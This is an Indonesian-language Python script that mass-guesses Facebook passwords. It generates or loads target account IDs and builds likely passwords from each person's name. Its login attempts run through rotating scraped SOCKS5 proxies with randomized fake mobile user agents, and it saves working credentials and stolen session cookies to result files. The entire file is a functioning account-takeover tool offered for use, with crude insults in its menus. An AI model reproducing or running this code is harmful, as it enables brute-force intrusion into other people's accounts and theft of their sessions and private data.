#link = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=2582347323&kid_directed_site=0&app_id=2582347323&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2582347323%26cbt%3D1699363885204%26e2e%3D%257B%2522init%2522%253A1699363885205%257D%26ies%3D1%26sdk%3Dandroid-16.0.0%26sso%3Dchrome_custom_tab%26nonce%3D8919a32a-313f-4909-931c-35873bb3307b%26scope%3Duser_birthday%252Copenid%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25221a1f4d32-fec4-4a0c-b591-afdd98c187bb%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522kmh0v851cpm8rlg838qg%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.wp.wattpad%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DOjxCQjdeWLOEz_c-3If13X3enpPc6pYonrAw4egv2YQ%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D1a1f4d32-fec4-4a0c-b591-afdd98c187bb%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.wp.wattpad%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25221a1f4d32-fec4-4a0c-b591-afdd98c187bb%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522kmh0v851cpm8rlg838qg%2522%257D&display=touch&locale=ms_MY&pl_dbl=0&refsrc=deprecated&_rdr").text
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from time import time as kontol
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from datetime import datetime
from rich.text import Text as tekz
pretty.install()
CON=sol()
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('proxy.txt','w').write(prox)
except Exception as e:
	print('Jaringan Internet Anda Bermasalah......')
prox=open('proxy.txt','r').read().splitlines()
ugen=[]
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['6','7','8','9','10','11','12','13','8.0.1','9.0','4.4.4'])
	c='I2223 Build/TP1A.220624.014'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,120)
	i='0'
	j=random.randrange(3200,5999)
	k=random.randrange(40,250)
	l='Mobile Safari/537.36'
	uaku2=f'{a} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
S = '\x1b[0;00m'
I = '\x1b[0;32m'
C = '\x1b[0;36m'
Q = '\x1b[00m'
ff = '\x1b[0;36m'
G = '\x1b[0;36m'
i = '\x1b[0;32m'
mm = '\x1b[0;36m'
R = '\x1b[0;36m'
W = '\x1b[0;00m'
c = '\x1b[0;32m'
o = '\x1b[0;31m'
T = '\x1b[1;94m'
E = '\033[38;2;255;127;0;1m'
HA = '\x1b[0;32m'
KU = '\x1b[0;33m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m'
h = '\x1b[1;92m'
hh = '\033[32m'
u = '\033[95m' 
kk = '\033[33m'
b = '\33[1;96m'
p = '\x1b[0;34m'
J = "\x1b[38;5;208m"
Z = "\x1b[0;90m"
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
ewe = random.choice([M,U,K,A,B,E,H,O,P,J,Z,T,P,p,S,I,C,Q,ff,G,i,mm,R,W,c,o,KU,HA])
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","November","Desember"]
month = datetime.now().month - 1
reall = bulan[month]
days = datetime.now().day
year = datetime.now().year
okc = f"OK-{days}-{reall}-{year}.txt"
cpc = f"CP-{days}-{reall}-{year}.txt"
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Selamat Pagi"
	elif 12 <= hours < 15:timenow = "Selamat Siang"
	elif 15 <= hours < 18:timenow = "Selamat Sore"
	else:timenow = "Selamat Malam"
	return timenow
def jalan(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	menu()
def logo():
	clear()
	print(f'''{ewe}
       ⣠⣶⣶⣦⡀
⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣴⣶⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣧⠀⠀⠀            
⠀⠀⠀⠀⣼⣿⣿⣿⡿⣿⣿⣆⠀⠀⠀⠀⠀⠀⣠⣴⣶⣤⡀⠀
⠀⠀⠀⢰⣿⣿⣿⣿⠃⠈⢻⣿⣦⠀⠀⠀⠀⣸⣿⣿⣿⣿⣷⠀
⠀⠀⠀⠘⣿⣿⣿⡏⣴⣿⣷⣝⢿⣷⢀⠀⢀⣿⣿⣿⣿⡿⠋⠀
⠀⠀⠀⠀⢿⣿⣿⡇⢻⣿⣿⣿⣷⣶⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣿⣿⣇⢸⣿⣿⡟⠙⠛⠻⣿⣿⣿⣿⡇⠀⠀⠀⠀
⣴⣿⣿⣿⣿⣿⣿⣿⣠⣿⣿⡇⠀⠀⠀⠉⠛⣽⣿⣇⣀⣀⣀⠀
⠙⠻⠿⠿⠿⠿⠿⠟⠿⠿⠿⠇⠀⠀⠀⠀⠀⠻⠿⠿⠛⠛⠛⠃''')
def menu():
	clear()
	logo()
	print(f"{x}-" *40)
	print(f'{B}[{J}1{B}] {P}Crack File\n{B}[{J}2{B}] {P}Hasil Crack\n{B}[{J}3{B}] {P}Crack Email')
	_____memek_____ = input(f' └──Pilih : ')
	if _____memek_____ in ['1']:File()
	elif _____memek_____ in ['2']:Result()
	elif _____memek_____ in ['3']:Email()
	elif _____memek_____ in ['']:Error()
	else:
		print(f' {P}└─{J} pilih yang benar ');time.sleep(3);back()
def Email():
	dump=[]
	rc = random.choice
	rr = random.randint
	xc = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep','90','96','25']
	global ok , cc
	nama = input(f'{P}[{H}?{P}] nama target : ')
	if ',' in str(nama):
		print(f' {P}└─{J} masukan nama, jangan kosong ')
		time.sleep(3);exit()
	doma = input(f'{P}[{H}?{P}] domain (ex:@gmail.com) : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		print(f' {P}└─{J} masukkan domain dengan benar ')
		time.sleep(3);exit()
	jumlah = input(f'{P}[{H}?{P}] total dump (max:10000) : ')
	for xyz in range(int(jumlah)):
		AA = nama
		BB = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
		CC = doma
		DD = f'{AA}{str(rc(BB))}{CC}'
		if DD in id:pass
		else:id.append(DD+'|'+nama)
		if len(dump)==999999:setting()
		sys.stdout.write(f"\r{P}[{H}±{P}] berhasil mengumpulkan {ewe}{len(id)} {P}email...");sys.stdout.flush()
		time.sleep(0.0000003)
	print("\r")
	setting()	
def Error():
	print(f' {P}└─{J} error in selecting features')
	time.sleep(4)
	back()
def File():
	try:
		fileX = input (f'{P}[{H}#{P}] masukkan nama file : ')
		for line in open(fileX, 'r').readlines():
			id.append(line.strip())
		setting()
	except IOError:
		exit(f" {P}└─{J} file {H}%s {J}not found"%(fileX))
def result():
	clear()
	print(f"{x}-" *40)
	print(f'{B}[{J}01{B}] {P}Hasil {h}OK{x} Anda ')
	print(f'{B}[{J}02{B}] {P}Hasil {k}CP{x} Anda ')
	kz = input(f' └── Pilih : ')
	if kz in ['02','2']:
		print(f"{x}-" *40)
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(f' {P}└─{J} file tidak di temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(f' {P}└─{J} anda tidak memiliki hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[0%s] %s {K}%s {x}Account'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+f' {K}'+str(len(hem))+f' {x}Account'+x)
			geeh = input(f' └── Pilih : ')
			print(f"{x}-" *40)
			try:geh = lol[geeh]
			except KeyError:
				print(f' {P}└─{J} pilih yang benar...')
				back()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(f' {P}└─{J} file tidak di temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}*---> {K}{cpkuni[0]}{P}│{K}{cpkuni[1]}')
				nocp +=1
			print(f"{x}-" *40)
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['01','1']:
		print(f"{x}-" *40)
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(f' {P}└─{J} file tidak di temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print(f' {P}└─{J} anda tidak mempunyai fileOK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[%s] %s {H}%s{x} Account'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'[%s] %s {H} %s {x}Account'%(cih,isi,(len(hem))))
			geeh = input(f' └── Pilih : ')
			print(f"{x}-" *40)
			try:geh = lol[geeh]
			except KeyError:
				print(f' {P}└─{J} pilih yang bener kontol ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(f' {P}└─{J} file tidak di temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f'{x}*---> {h}{cpkuni[0]}{P}│{H}{cpkuni[1]}{P}│{h}{cpkuni[2]}{x}')
				nocp +=1
			print(f"{x}-" *40)
			input(f'{x}[{m} Klik Enter{x} ]')
			back()
	elif kz in ['3']:
		back()
	else:
		print(f' {P}└─{J} pilih yang bener kontol ')
		back()
def setting():
	if len(id)==0:
		exit(f' {P}└─{J} uid tidak publik')
	for bacot in id:
		xx = random.randint(0,len(id2))
		id2.insert(xx,bacot)
	auto()
def auto():
	print(f'{P}-'*40)
	with tred(max_workers=30) as pool:
			for akun in id2:
				idf,nama = akun.split('|')[0],akun.split('|')[1].lower()
				depan = nama.split(" ")[0]
				pwv = ['123456']
				if len(nama)<=5:
					if len(depan)<=1 or len(depan)<=2:
						pass
					else:
						pwv.append(depan+"09")
						pwv.append(depan+"12")
						pwv.append(depan+"21")
						pwv.append(depan+"22")
						pwv.append(depan+"23")
						pwv.append(depan+"123")
						pwv.append(depan+"1234")
						pwv.append(depan+"12345")
						pwv.append(depan+"123456")
				else:
					if len(depan)<=1 or len(depan)<=2:
						try:
							tengah = nama.split(" ")[1]
							if len(tengah)<=3:
								pass
							else:
								pwv.append(tengah+"09")
								pwv.append(tengah+"12")
								pwv.append(tengah+"21")
								pwv.append(tengah+"22")
								pwv.append(tengah+"23")
								pwv.append(tengah+"123")
								pwv.append(tengah+"1234")
								pwv.append(tengah+"12345")
								pwv.append(tengah+"123456")
								pwv.append(nama)
						except:
							try:
								belakang = nama.split(' ')[2]
								if len(belakang)<=3:pass
								else:
									pwv.append(belakang+"09")
									pwv.append(belakang+"12")
									pwv.append(belakang+"21")
									pwv.append(belakang+"22")
									pwv.append(belakang+"23")
									pwv.append(belakang+"123")
									pwv.append(belakang+"1234")
									pwv.append(belakang+"12345")
									pwv.append(belakang+"123456")
									pwv.append(nama)
							except:pwv.append(nama)
					else:
						pwv.append(nama)
						pwv.append(depan+"09")
						pwv.append(depan+"12")
						pwv.append(depan+"21")
						pwv.append(depan+"22")
						pwv.append(depan+"23")
						pwv.append(depan+"123")
						pwv.append(depan+"1234")
						pwv.append(depan+"12345")
						pwv.append(depan+"123456")
				if 'validate' in method:
					pool.submit(validate,idf,pwv)
				else:
					pool.submit(validate,idf,pwv)
	print()
	print('-'*40)
	print(f'\r{A}[{ewe}±{A}] {P}crack telah selesai jumlah OK:{ok} jumlah CP:{cp} ')
def kolop():
	a = random.choice(['de-at','in-id','ms-my','uk-ua','en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr','en-au','th-th','hi-in','zh-tw','my-zg','en-nz','en-ca','es-mx','ko-kr','el-gr','en-ez','ar-ae','fr-ch','nl-nl','gu-in'])
	b = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	c = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	b2 = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	c2 = random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	d = f"Mozilla/5.0 (Linux; U; Android {str(random.randint(6,14))}; {a}; OPPO {b}{str(random.randint(10,99))}{c} Build/{b2}{str(random.randint(1,999))}{c2}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(75,117))}.0.{str(random.randint(2500,5900))}.{str(random.randint(80,200))} Mobile Safari/537.36 HeyTapBrowser/{str(random.randint(6,47))}.{str(random.randint(7,8))}.{str(random.randint(2,40))}.{str(random.randint(1,9))}"
	return d

def validate(idf,pwv):
	global loop,ok,cp
	ewe = random.choice([M,U,K,A,B,E,H,O,P,J,Z,T,P,p,b,S,I,C,Q,ff,G,i,mm,R,W,c,o,KU,HA])
	sys.stdout.write(f"\r{P}[{b}crack{P}]-[{ewe}{loop}{P}/{len(id)}]-[{H}{ok}{P}/{K}{cp}{P}] "),
	sys.stdout.flush()
	ua2 = kolop()
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			Head1 = ({"connection": "keep-alive", "accept-language": "id,en-US;q=0.9,en;q=0.8", "sec-fetch-mode": "navigate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "sec-fetch-sest": "document", "sec-fetch-site": "none", "cache-control": "max-age=0", "sec-fetch-user": "?1", "upgrade-insecure-requests": "1", "host": "m.alpha.facebook.com", "user-agent": ua2})
			ress = ses.get('https://m.alpha.facebook.com/login.php?',headers = Head1).text
			Data = {
				'm_ts': re.search('name="m_ts" value="(.*?)"', str(ress)).group(1),
				'li': re.search('name="li" value="(.*?)"', str(ress)).group(1),
				'try_number': 0,
				'unrecognized_tries': 0,
				'email': idf,
				'prefill_contact_point': idf,
				'prefill_source': 'browser_dropdown',
				'prefill_type': 'password',
				'first_prefill_source': 'browser_dropdown',
				'first_prefill_type': 'contact_point',
				'had_cp_prefilled': True,
				'had_password_prefilled': True,
				'is_smart_lock': False,
				'bi_xrwh': 0,
				'encpass': f"#PWD_BROWSER:0:{str(kontol()).split('.')[0]}:{pw}",
				'fb_dtsg': re.search('{"dtsg":{"token":"(.*?)"', str(ress)).group(1),
				'jazoest': re.search('name="jazoest" value="(\d+)"', str(ress)).group(1),
				'lsd': re.search('name="lsd" value="(.*?)"', str(ress)).group(1),
				'__dyn': '',
				'__csr': '',
				'__req': random.choice(['1','2','3','4','5','6','7','8','9']),
				'__a': re.search('"encrypted":"(.*?)"', str(ress)).group(1),
				'__user': 0
			}
			Head = {
				'Connection': 'keep-alive',
				'Accept': '*/*',
				'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
				'sec-ch-ua-mobile': '?1',
				'Origin': 'https://m.alpha.facebook.com',
				'X-FB-LSD': re.search('name="lsd" value="(.*?)"', str(ress)).group(1),
				'X-ASBD-ID': '129477',
				'Content-Type': 'application/x-www-form-urlencoded',
				'Content-Length': str(len((Data))),
				'sec-ch-ua-platform': '"Android"',
				'Sec-Fetch-Site': 'same-origin',
				'Referer': 'https://m.alpha.facebook.com/login.php?',
				'Host': 'm.alpha.facebook.com',
				'Sec-Fetch-Mode': 'cors',
				'Sec-Fetch-Dest': 'empty',
				'User-Agent':ua2,
				'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="{}", "Chromium";v="{}"'.format(re.search('Chrome/(\d+).', str(ua2)).group(1), re.search('Chrome/(\d+).', str(ua2)).group(1)),
				'Accept-Encoding': 'gzip, deflate, br',
				'viewport-width': '424'
			}
			ress2 = ses.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', headers = Head, data = Data, allow_redirects = False,proxies=proxs)
			if 'c_user' in ses.cookies.get_dict():
				cookie = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P} ✶ ━━━⫸ {H}{idf}{P}│{H}{pw}{P}│{H}{cookie}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+cookie+'\n')
				ok+=1
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print(f'\r{P} ✶ ━━━⫸ {K}{idf}{P}│{K}{pw}{N}')
				cp+=1
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	menu()
